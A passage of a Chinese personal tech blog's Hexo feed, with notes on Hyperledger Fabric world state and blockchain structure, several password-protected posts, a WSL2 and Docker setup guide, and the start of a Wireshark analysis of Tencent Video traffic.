src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1616637519498-0e9fd021-a687-4bb8-a324-ac7cecda250f.png#align=left&display=inline&height=266&name=image.png&originHeight=339&originWidth=863&size=90524&status=done&style=none&width=677" alt="image.png"><br><em>一个账本世界状态包含两个状态。第一个状态是： key=CAR1 和 value=Audi。第二个状态中有一个更复杂的值：key=CAR2 和 value={model:BMW, color=red, owner=Jane} 。两个状态的版本都是 0。</em><br>账本状态记录了一组与特定业务对象有关的事实。我们的示例展示的是 CAR1 和 CAR2 这两辆车的账本状态，二者都各有一个值和一个键。应用程序可以调用智能合约，该合约使用简单的账本 API 来<strong>获取</strong>、<strong>写入</strong>和<strong>删除</strong>状态。注意状态值可以是简单值（Audi…），也可以是复合值（type:BMW…）。经常会通过查询世界状态来检索具有某些特定属性的对象，例如查找所有红色宝马汽车。<br>应用程序提交那些会更改世界状态的交易，这些交易最终被提交到账本区块链上。应用程序无法看到 Hyperledger Fabric SDK（软件开发工具包）设定的<a href="https://hyperledger-fabric.readthedocs.io/zh_CN/latest/txflow.html">共识机制</a>的细节内容，它们能做的只是调用智能合约以及在交易被收进区块链时收到通知（<strong>所有被提交的交易，无论有效与否，都会被收进区块链</strong>）。Hyperledger Fabric 的关键设计在于，只有那些受到相关<strong>背书组织签名</strong>的交易才会更新世界状态。<br>您还会注意到，每个状态都有一个版本号，在上面的图表中，状态 CAR1 和 CAR2 都处于它们的初始版本 0。版本号是供 Hyperledger Fabric 内部使用的，并且每次状态更改时版本号会发生递增。每当更新状态时，都会检查该状态的版本，以确保当前状态与背书时的版本相匹配。这就确保了世界状态是按照预期进行更新的，没有发生并发更新。<br>最后，首次创建账本时，世界状态是空的。<strong>因为区块链上记录了所有代表有效世界状态更新的交易，所以任何时候都可以从区块链中重新生成世界状态。</strong>这样一来就变得非常方便，例如，<strong>创建节点时会自动生成世界状态</strong>。此外，如果某个节点发生异常，<strong>重启该节点时能够在接受交易之前重新生成世界状态</strong>。</p><h2 id="区块链"><a href="#区块链" class="headerlink" title="区块链"></a>区块链</h2><p>世界状态存储了与业务对象当前状态相关的事实信息，而区块链是一种历史记录，它记录了这些业务对象是如何到达各自当前状态的相关事实。<strong>区块链记录了每个账本状态之前的所有版本以及状态是如何被更改的。</strong><br><strong>区块链的结构是一群相互链接的区块的序列化日志，其中每个区块都包含一系列交易，各项交易代表了一个对世界状态进行的查询或更新操作。</strong></p><blockquote><p>在这里，官方提到了一个排序服务。<br>其中重要的是<strong>区块排序以及区块内的交易排序</strong>，这一机制是在 Hyperledger Fabric 的<strong>排序服务</strong>组件首次创建区块时被建立起来的。</p></blockquote><p>每个区块的头部都包含区块交易的一个哈希，以及前一个区块头的哈希。这样一来，账本上的所有交易都被按序排列，并以密码方式连接在一起。这种哈希和链接使账本数据变得非常安全。即使某个保存账本的节点被篡改了，该节点也无法让其他节点相信自己拥有“正确的”区块链，这是因为账本被分布在一个由独立节点组成的网络中。<br><strong>区块链总是以文件实现</strong>，而与之相反的是<strong>，世界状态以数据库实现</strong>。这是一个明智的设计，因为区块链数据结构高度偏向于非常小的一组简单操作。第一项操作被放在区块链的末尾，就目前来说，查询操纵相对少见。</p><p>当<strong>应用程序需要访问账本和链码的时候</strong>，他们总是需要连接到 Peer 节点。Hyperledger Fabric SDK 将这个操作变得非常简单，它的 API 使应用程序能够连接到 Peer 节点，<strong>调用链码生成交易，提交交易到网络，在网络中交易会被排序并且提交到分布式账本中</strong>，并且在这个流程结束的时候接收到事件。<br><strong>！不过，我们注意到 xuperchain 在文档中提到了使用 JDK 通过</strong><a href="https://xuper.baidu.com/n/xuperdoc/development_manuals/XuperRPC.html#id1"><strong>rpc 接口</strong></a><strong>构造交易发布！</strong><br><strong>目前需要知道：</strong></p><ul><li>智能合约发布的交易，发布方地址是什么，接收方地址是什么，他们在链上存储的和普通交易是否有区别？</li><li>在搞清问题 1 之后，是否有可能构造交易，把添加自定义字段，然后使用 rpc 接口发布？</li><li>因为区块链链式结构只需要将上一个区块的 hsah 包含在本区块头中，而 DAG 则将多个（至少两个块作为前置块，那么它们是如何连接的）</li></ul><hr><p>补充一个：<br>【1】快照链<a href="https://github.com/vitelabs/go-vite/blob/master/ledger/chain/block/snapshot_block.go">https://github.com/vitelabs/go-vite/blob/master/ledger/chain/block/snapshot_block.go</a><br>【2】真正的 DAG？<a href="https://github.com/vitelabs/go-vite/blob/master/ledger/chain/chain.go">https://github.com/vitelabs/go-vite/blob/master/ledger/chain/chain.go</a><br>【3】靠谱一点的白皮书<a href="https://www.yuque.com/attachments/yuque/0/2021/pdf/1629942/1616644033176-46652e0d-d91b-41c0-823a-ee503f7d8264.pdf?_lake_card=%7B%22uid%22:%221616644031374-0%22,%22src%22:%22https://www.yuque.com/attachments/yuque/0/2021/pdf/1629942/1616644033176-46652e0d-d91b-41c0-823a-ee503f7d8264.pdf%22,%22name%22:%22vite_cn.pdf%22,%22size%22:1164591,%22type%22:%22application/pdf%22,%22ext%22:%22pdf%22,%22progress%22:%7B%22percent%22:99%7D,%22status%22:%22done%22,%22percent%22:0,%22id%22:%22N6Qwn%22,%22card%22:%22file%22%7D">vite_cn.pdf</a><br>【4】xuper 里的交易定义<a href="https://github.com/xuperchain/xuperchain/blob/7de83707283ba872129d66aa5e4435d04ed67bee/core/cmd/cli/types.go">https://github.com/xuperchain/xuperchain/blob/7de83707283ba872129d66aa5e4435d04ed67bee/core/cmd/cli/types.go</a><br>【5】xuper 的快照链<a href="https://github.com/xuperchain/xuperchain/blob/9d9e60a3bcd87bafafdac51784b504a310ead3d7/core/xmodel/xmodel.go#L51">https://github.com/xuperchain/xuperchain/blob/9d9e60a3bcd87bafafdac51784b504a310ead3d7/core/xmodel/xmodel.go#L51</a><br>【6】<a href="https://www.jianshu.com/p/8734e06d558f">GHOST，DAG，SPECTRE，PHANTOM 和 CONFLUX 技术原理</a>–挺全的<br>【7】<a href="https://confluxnetwork.org/zh/developers/assets">https://confluxnetwork.org/zh/developers/assets</a>–conflux 区块链，清华自研，树形结构，网站挺好的，白皮书也行</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1616660756279-b4421d16-f36d-426a-a14b-01f82d5cdfeb.png#align=left&display=inline&height=362&name=image.png&originHeight=724&originWidth=1419&size=128783&status=done&style=none&width=709.5" alt="image.png"><br>【8】conflux 的白皮书<a href="https://www.yuque.com/attachments/yuque/0/2021/pdf/1629942/1616675325254-7b3d2143-8a29-4ae3-979b-0da2ca0b759e.pdf?_lake_card=%7B%22uid%22:%221616675322385-0%22,%22src%22:%22https://www.yuque.com/attachments/yuque/0/2021/pdf/1629942/1616675325254-7b3d2143-8a29-4ae3-979b-0da2ca0b759e.pdf%22,%22name%22:%22Conflux_Technical_Presentation_whitepaper.pdf%22,%22size%22:1899775,%22type%22:%22application/pdf%22,%22ext%22:%22pdf%22,%22progress%22:%7B%22percent%22:99%7D,%22status%22:%22done%22,%22percent%22:0,%22id%22:%22DpkoK%22,%22card%22:%22file%22%7D">Conflux_Technical_Presentation_whitepaper.pdf</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Project-Implementation</title>
      <link href="/2021/Project-Implementation/"/>
      <url>/2021/Project-Implementation/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="6019c468f4888e68574d875a2af9ed9f18bf151ae1177a7db5076f9b7d8954a1">760f982ea218ceab0ac94960889a6b3e60fe4ba2ced4721b519cbf7442a63b9d1d389686310409434dc6f557d77908efa0f2136993caa8347bfb0ca7020750654b74df3407a2f6acfae8f2d3d0ad4f39b757c95e43e5808f1379ed54f62bab4419599040235710351ca2ded5c01cdd0685a13f638251b015a4f07a46d0db4b2294626545dfd8b2935c889cf36256a6ba4b7921ce469e98d313c54e882147cf809ddb9837b9090825e1b563ff3d41e06676491813de5229cd75df217b81ed4075a2e4bef23beed54df8d4781b583f24441a2d1284b9b74527c179d3daf3acf8a5432b085ebfe38f3f3b44b850dd19acdec4cee057233a9537c43b946df67a6b15dca6e8c4ea6725aa3b988653edb69d7710f65cb3feb98ef4241be63ae079c21ccb094e43034788f646555a49b8cb3ab8b65a3173ab537ffe22028848e33297eafcd5076d72ef5a14783e9bd7da62015a97ec0fadefa9026bf496c0327501eaffa04b04d14912795c6f7c40f0b8363ad315e9c5df0e412ccfb2b53add680a97ba322699cfe1b1290c12a37feed35ddd20ed6faa670b864bee21d5ac6ce085ba450b71b814ab5d13e6fce5a4900c2238317e43cfb7c75032515856a5fb9dd92511056c510e387526a9bf2002ec7d72f2b3fbb25b4c7a24c8db33546a3419f676629e55c20fd6cc16db7a4d3a81178c0366925c929ffa2727c05a8c80d9f2c7e87962fb9e2bfe4bcd6742311d32bf222ee28866934af4424af3da978e116bdcaf9ebfa972023f44dd0e6926105a3eca387e900aef81727ec9b6daba18d1ac504bdf049da02db3d87d64d1a081a2ccbd05edb3991d4694f5108343a24c5dd5fec37796c5883e604fad779087f381bdd364a6bda158b6f11b90524de510dff6eb42a6dda6f15313387ee8e083d1dc0ac7c95f1fae11f680ee380309715ac74ab3c81771880d060e35cba58904aca2d289b0b83d052599302c7e0062b70e7ed02bbb4bce65d9a760aba0c983f4c5af15e977bfd06a2e99a174b53a9e2ab48fc5f5b6d5a0fcd7e55df8e9dc259dddf177531a25c58131449c64f96ee707f858c0da75a23852136c11cc8ca8320404ce7d4c00dd52dee491c38bf6be312306971f69b36ff793eacccde92daf7316128ead7b721c89de9c9aa37182c06ce619aff0d7bde3a050dd5caa628a97591f0bf89c7b56a86698fc2be6b875f6e939ae144e15c85b</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XuperChain</title>
      <link href="/2021/XuperChain/"/>
      <url>/2021/XuperChain/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="8e64206baecaea125e23bccdb83170acbc5cd78a2e73c2358af376bee6b1001a"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>A-glimpse-of-smart-contracts</title>
      <link href="/2021/A-glimpse-of-smart-contracts/"/>
      <url>/2021/A-glimpse-of-smart-contracts/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="dfca8fe08ceb1ab68915406acf7cd9672447ebe096a1dedf66bdc1819b805e04"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Build-xuperchain</title>
      <link href="/2021/Build-xuperchain/"/>
      <url>/2021/Build-xuperchain/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="5ac1ec1b84531230b1b80e6e19be889674a8032a93b2e34514f34b3b4719884f"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Reinstall-WSL2-and-docker</title>
      <link href="/2021/Reinstall-WSL2-and-docker/"/>
      <url>/2021/Reinstall-WSL2-and-docker/</url>
      
        <content type="html"><![CDATA[<p>装机一时爽，重装 xxx。</p><a id="more"></a><h1 id="装-wsl2"><a href="#装-wsl2" class="headerlink" title="装 wsl2"></a>装 wsl2</h1><p>首先，这个不要在 MS 里安装，因为默认是 C 盘，当然，如果你 C 盘很大但我没说。<br>如果安在 C 盘可以通过导出到别的盘，就是有点耗时间。<br>在这里，参考<a href="https://zhuanlan.zhihu.com/p/263089007">https://zhuanlan.zhihu.com/p/263089007</a>，可以直接下载对应的安装包，然后自定义路径，非常方便了。<br>然后安装镜像快照，防止由于 upgrade 导致的崩溃。<br>我尝试安装了了 timeshift<br><a href="https://zhuanlan.zhihu.com/p/94105263">https://zhuanlan.zhihu.com/p/94105263</a><br><a href="https://prpr.fr/2020/04/01/2020-04-01-1/">https://prpr.fr/2020/04/01/2020-04-01-1/</a><br>但是在使用命令行的时候，检查不到盘符？？<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1615692482824-96994f4c-6ca6-4b13-9497-54d104220e14.png#align=left&display=inline&height=132&name=image.png&originHeight=264&originWidth=517&size=267348&status=done&style=none&width=258.5" alt="image.png"><br>尬住，于是我又好一顿查。<br>在 wsl 的官方仓库中，有人在 2017 年就提出了这个问题<a href="https://github.com/microsoft/WSL/issues/2147">https://github.com/microsoft/WSL/issues/2147</a>，但是官方的回答是，没有计划。无 fuck 说。<br>网上找了一顿，没有相关教程，随作罢，只能<strong>禁用 upgrade!!!!!</strong></p><p>然后需要，添加源！而非全部替换成阿里的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">sudo nano /etc/apt/sources.list<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">deb http://mirrors.aliyun.com/ubuntu/ focal main restricted<br>deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted<br>deb http://mirrors.aliyun.com/ubuntu/ focal universe<br>deb http://mirrors.aliyun.com/ubuntu/ focal-updates universe<br>deb http://mirrors.aliyun.com/ubuntu/ focal multiverse<br>deb http://mirrors.aliyun.com/ubuntu/ focal-updates multiverse<br>deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse<br>deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted<br>deb http://mirrors.aliyun.com/ubuntu/ focal-security universe<br>deb http://mirrors.aliyun.com/ubuntu/ focal-security multiverse<br></code></pre></td></tr></table></figure><h1 id="su-root-认证失败如何解决"><a href="#su-root-认证失败如何解决" class="headerlink" title="su root 认证失败如何解决"></a>su root 认证失败如何解决</h1><p>刚开始安装虚拟机操作系统时，可能会遇到 su root 认证失败的情况，这是因为 root 没有初始化，初始化的步骤如下：ctr+Alt+T 打开终端，然后输入 sudo passwd(不是 password) root，之后会提示 Enter new UNIX password: 输入新密码，然后提示 Retype new UNIX password: 再次输入上次输入的密码就 OK 了<br>————————————————<br>版权声明：本文为 CSDN 博主「四季帆」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/qq_41076734/article/details/79518361">https://blog.csdn.net/qq_41076734/article/details/79518361</a></p><h1 id="安装-docker"><a href="#安装-docker" class="headerlink" title="安装 docker"></a>安装 docker</h1><p><a href="https://www.jianshu.com/p/a20c2d58eaac?utm_campaign=haruki">https://www.jianshu.com/p/a20c2d58eaac?utm_campaign=haruki</a></p><h1 id="终端快捷键"><a href="#终端快捷键" class="headerlink" title="终端快捷键"></a>终端快捷键</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1615709708737-5cb2e732-1240-45a9-83ed-0fe0287a7fd2.png#align=left&display=inline&height=423&name=image.png&originHeight=845&originWidth=1453&size=1899574&status=done&style=none&width=726.5" alt="image.png"><br>分屏快捷键如下：</p><ul><li>水平分屏：Alt + Shift + 减号</li><li>垂直分屏：Alt + Shift + 加号</li><li>切换聚焦的分屏视图：alt + (left/right/up/down)</li><li>调节分屏的窗口大小：alt + shift + (left/right/up/down)</li><li>缩放当前视图：Ctrl+ 加号/减号 （或者 Ctrl + 鼠标滚轮）<blockquote><p>那我不想分屏，我要删掉一个怎么办？ 这个问题问的好，直接输入 exit 即可退出分屏</p></blockquote></li></ul><h1 id="运行-GUI-程序"><a href="#运行-GUI-程序" class="headerlink" title="运行 GUI 程序"></a>运行 GUI 程序</h1><p>VcXsrv 差评，步骤太多，关键还有问题，它透不过防火墙，因为防火墙里就找不到这个东西！！！！<br>明显人就傻了。<br>但是，机智如我，在 b 站找到了新的教程，MobaXterm，新宠，无敌。<br><a href="https://www.bilibili.com/read/cv6585580/">https://www.bilibili.com/read/cv6585580/</a><br>效果如下：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1615710515875-b7251d8c-1514-4775-8d5e-c801cbcae2dc.png#align=left&display=inline&height=398&name=image.png&originHeight=796&originWidth=1319&size=148374&status=done&style=none&width=659.5" alt="image.png"><br>真的简单，巨省事儿。谢谢作者！</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Homogenous-encryption</title>
      <link href="/2021/Homogenous-encryption/"/>
      <url>/2021/Homogenous-encryption/</url>
      
        <content type="html"><![CDATA[<p>同态加密</p><a id="more"></a><h1 id="H1"><a href="#H1" class="headerlink" title="H1"></a>H1</h1><p>【1】<a href="https://github.com/tencentyun/qcloud-documents/blob/master/product/%E5%8C%BA%E5%9D%97%E9%93%BE/TBaaS/%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%97/%E5%90%88%E7%BA%A6%E5%BC%80%E5%8F%91/Hyperledger%20Fabric%20%E5%90%88%E7%BA%A6/GO%20%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%90%8C%E6%80%81%E5%8A%A0%E5%AF%86%E6%94%AF%E6%8C%81.md">GO 智能合约同态加密支持</a>– paillier 包是根据轻量同态加密 Paillier 算法实现的<br>【2】<a href="https://www.yuque.com/attachments/yuque/0/2021/pdf/1629942/1614060520927-99055406-4730-4010-956c-b77e9f7dd316.pdf?_lake_card=%7B%22uid%22:%221614060518504-0%22,%22src%22:%22https://www.yuque.com/attachments/yuque/0/2021/pdf/1629942/1614060520927-99055406-4730-4010-956c-b77e9f7dd316.pdf%22,%22name%22:%22%E5%9F%BA%E4%BA%8E%E5%8C%BA%E5%9D%97%E9%93%BE%E5%92%8C%E5%90%8C%E6%80%81%E5%8A%A0%E5%AF%86%E7%9A%84%E7%94%B5%E5%AD%90%E5%81%A5%E5%BA%B7%E8%AE%B0%E5%BD%95%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4%E6%96%B9%E6%A1%88.pdf%22,%22size%22:2016593,%22type%22:%22application/pdf%22,%22ext%22:%22pdf%22,%22progress%22:%7B%22percent%22:99%7D,%22status%22:%22done%22,%22percent%22:0,%22id%22:%22LLbwX%22,%22card%22:%22file%22%7D">基于区块链和同态加密的电子健康记录隐私保护方案.pdf</a><br>【3】<a href="https://fisco-bcos-documentation.readthedocs.io/zh_CN/dev/docs/articles/3_features/38_privacy/privacy_protection_homomorphic_encryption.html">链上密文参与计算？同态加密尽显神通 | FISCO BCOS 隐私特性</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Pyramid-space-encoding</title>
      <link href="/2021/Pyramid-space-encoding/"/>
      <url>/2021/Pyramid-space-encoding/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="8401ed9b6378c0ca29ca9d70e100071c777e5c06cfbcf4733f6295cffcb74f63"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MCM-Post-Competition-Summary</title>
      <link href="/2021/MCM-Post-Competition-Summary/"/>
      <url>/2021/MCM-Post-Competition-Summary/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="4eda2e6f99a1cf22022da098f6ed8b0eaebae6bfb361d7afc0fbb056f087da00">a878aca5d3b74c79800e37344b48042a3a0d18554ca21b5fd44c4d78137a316babb46472e9e3c4f755bacbb652b3430253655000fdeb7e959a657e3a9b050071912b5febe9679c83972b4d8edb9cfdb0bf46c25efdbf3ae545b93b5a29eb74d99a885d5df78a2cb6293e9e07f9883c33d9ed0fbd23e6eab0a3938275447c858465831d943441e3dd745cbb40db1150b44a9c2c52e76dc2226001d100703e8dd92d46d517a81bda16fd2851d02a061ede99f5dd25cb7854cea96f1c8ca504e13c77d189daa18ecbc891108be2e7cad89e6f92ae8f2a029bac6af1210637a925802f6ead7b4e147859c847ef33906b7447d7d093375f04bda88b2f838068f0547af55f61d3b786830f3afef1920ae0e23eab0b38fa0b78f09852eec6885e8e99770dc7e7bbc64aad1f946266481e455a0ef2622c08e648d559cd699427720b4179b307360941bed5dbff1fa6337d05a6fe8af779a86746549a0b2a02951f3f09573e42c7c016e3763abd69ae6f4877d5ec1bfdcd18c31edd8369466f56bbdda5f911d71531a51ecc1e515b5203fa4f3637da658df2a90f26582ead62ae67d7d1c85f374e6913ab035aac483ce1b982930d0a3cf981835c7de6aedf7145a0729b6b6ab1a077a2bf99435270da6fafac95b4bd30ec0aa42babd99a7d7c3b408710e29f47f06b82ff6659d6b1d374fb6c2c5b74ea9486bf073de2b89f26020d8fc01466f3623ae210a38538d97fab27b68bd8418064fffb18313483e0b9308788f9fdec110ecbc0cf1062db513f6424018a44a8c09083277008ca4b7c439d3201b6e94b49470d20e8fb096fa6f9f04c74a39dc1f88547e49452be7fac4b17300e6ae7aaf0220d6dd8288ae90cf18d2ecb0fa0f86a7163ba9fda58d19c14147c17bb0613c19633c470f133c2f3d72d367da11f29b32003f10d76ada6f5c77e015d422b272caa1387922f2ff338ed2e3994235f5d9e4a7712df6946f4012068a177bbbaab3e902f26b62b4f491f8eabb086b55409626791be8c594b807e2f65db735679fd9ec9cced99c00a2a4f5c9dad55da726d92a705bfd263f8739c4e41b4a078588bf44e9ff895af5913a7dd45b5ca17278e6282598353a8d506ab7c5438e8fdcd4509443c0869e6cad263cf8ed8e5497040d39f630c504b1df9886f05537dcfda79e8269dd75d1aa3a3e612cf2aa2cfb49fae7e6cbc166cf796a8b423885d2b7625a2ffc4fb0e8b003039e21264f2c26ee69cfc9dca137d2f3b4cedb505bdbdab963f6107ed852fb814fed48be674869dc742275e9f240a306dd48e5ef831d3f308fc1a6cfc9846763c54a9d139dff268b255a60479e05e53e05a18be37d75bdefa50052822578b7076898ef5055dfcff3a7cdcff9bb474ed9c5a8876c98dccf0422e27d3c67a59cc9d1249b23ddf272a543cc5ae53827ab5625d48fc3cf68ae63e628164f25163c3eb91f35bbf7c10aa7db278072580a33bc98baea0b44063cd4215927fc49a6c07b34ba2bdce09d9e58479b86d8b5899c03392a14187cfbb9d62ce1df53f19d9c35141ab645c8937b84787f631bceb81b6511b94fcd3084d3d79b787a53ecf7a52c5e63cbe910816b042b7279bfecd6ba8d53eb753cde47ffec719a9c71406bc1b64be6b4ba71cb4758c246fd9438a3329528ad1cfe202b874704696ce1c4ebe05a71b81031a24a308201d1a5e166403204da58a4b1388fdf59f2b60df5f477314ce34d70fc62a6701d4c3ac8bfc251e70efb83478fbcea96c062be55c58d8d4a72178730063f8084546c165f93dd68758b0865d0b4ec8cbd6b89ba4599298e6b1f8f36a9114cc254caa189a690ac8e9ed13602995c23bf7cc7229d3d2fcc06a59e1aa988956d5dda1733dad667a6982c0e0f114cbc4e2d3e16c67c36db98f55af37caa50ad7176b4a3cb2b22114005ac50118e89cdb0fe13ab795fe5ce1fdcaa9adb0e4164c2c7268df1b7db6e0e67f84952dec4e88d4772f0809047f1a62b3e971130e308e2f3c5f10db5a1ee35a6b726466f242203428493c784f5e13e4d35d164107969255c248cafcd02d8760d4ef59914637f1472bf5</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 绘图 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数模 </tag>
            
            <tag> 绘图 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Analysis-video-traffic-with-wireshark</title>
      <link href="/2021/Analysis-video-traffic-with-wireshark/"/>
      <url>/2021/Analysis-video-traffic-with-wireshark/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>在本次分析中，我选择了腾讯视频流量进行抓包分析。<br>首先，腾讯视频的流量是走的 tcp 协议，而且全站 https 加密，因此报文内容是乱码，需要解码。<br>以 windows 系统+Chrome 浏览器为例，首先要导出浏览器存储的密钥，通过计算机属性——高级系统设置——环境变量，新建一个变量名“SSLKEYLOGFILE”的变量，变量值是导出的密钥具体文件地址。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1611732235503-1dc7abad-f698-4828-982b-d9cdc823585e.png#align=left&display=inline&height=174&name=image.png&originHeight=347&originWidth=522&size=201841&status=done&style=none&width=261" alt="image.png"><br>经测试，chrome 和 firefox 均无法导出密钥，最终找到解决办法如下。<br>运行命令</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-string">&quot;C:\Program Files (x86)\Google\Chrome\Application\chrome.exe&quot;</span> --ssl-key-<span class="hljs-built_in">log</span>-file = <span class="hljs-string">&quot;E:\sslkey.log&quot;</span><br></code></pre></td></tr></table></figure><p>即可。<br>然后再在 wireshark 中绑定<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1611733807513-71ffc614-6119-4b97-a485-7432d3ca81af.png#align=left&display=inline&height=255&name=image.png&originHeight=509&originWidth=727&size=33775&status=done&style=none&width=363.5" alt="image.png"><br><del>但是还是不行，不知道什么原因，可能是没有重启电脑？协商的 sslkey 不能随时更新到 log 文件中，我也不知道为什么，就先不管它的传输层 tcp 报文原始信息了。</del><br><del>确实重启电脑就好了。</del></p><h1 id="业务流程"><a href="#业务流程" class="headerlink" title="业务流程"></a>业务流程</h1><p>网络视频业务可以从 1.主页访问，2.外链链入。<br>不同网站视频页面的 url 格式不同。</p><p>| <strong>业务提供商</strong> |         <strong>视频页面的 url 正则表达式</strong>         |<br>| :————: | :——————————————-: | ——————————————— |<br>|      优酷      | v\.youku\.com/v<em>show/id</em>[A-Za-z0-9=]{17}.* |<br>|   优酷移动端   |               .*api\.(mobile                | 3g)\.youku\.com/videos/[A-Za-z0-9=]{17}/.* |<br>|    搜狐视频    |     tv\.sohu\.com/[0-9]{8}/n[0-9]{9}.*     |<br>|    腾讯视频    |     v\.qq\.com/x/cover/[a-z0-9]{15}.*      |<br>|     爱奇艺     |   www\.iqiyi\.com/[a-z]_[a-z0-9]{10}.*    |<br>|      CNTV      |   tv\.cntv\.cn/video/[A-Za-z0-9=]{16}/.*   |<br>|      PPTV      |   v\.pptv\.com/show/[A-Za-z0-9=]{16}/.*    |</p><p>用户在观看视频时，可能会有一系列交互动作，可以分成两类：播放操作与社交行为。<br>前者包括：</p><ul><li>暂停</li><li>重新播放</li><li>跳转</li><li>调节清晰度</li><li>静音</li><li>调节播放速度等</li></ul><p>后者包括：</p><ul><li>评论</li><li>收藏</li><li>点赞</li><li>分享等</li></ul><h2 id="通信报文分析"><a href="#通信报文分析" class="headerlink" title="通信报文分析"></a>通信报文分析</h2><p>【1】<a href="https://segmentfault.com/a/1190000018746027">https://segmentfault.com/a/1190000018746027</a><br>【2】<a href="https://www.jianshu.com/p/a3a25c6627ee">https://www.jianshu.com/p/a3a25c6627ee</a><br>【3】<a href="https://www.dell.com/community/%E5%85%A5%E9%97%A8%E7%BA%A7%E5%92%8C%E4%B8%AD%E7%AB%AF/%E5%A6%82%E6%9E%9C%E7%9C%8B%E4%BA%86%E8%BF%99%E4%B8%AA%E4%BD%A0%E8%BF%98%E6%98%AF%E4%B8%8D%E4%BC%9A%E7%94%A8Wireshark-%E9%82%A3%E5%B0%B1%E6%9D%A5%E6%89%BE%E6%88%91%E5%90%A7-8%E6%9C%886%E6%97%A5%E5%AE%8C%E7%BB%93/td-p/7007033">https://www.dell.com/community/</a><br>【4】<a href="https://imququ.com/post/http2-traffic-in-wireshark.html">https://imququ.com/post/http2-traffic-in-wireshark.html</a><br>对于腾讯视频 5 分钟的观看抓包。<br>得到以下结论：</p><ul><li>首先进行 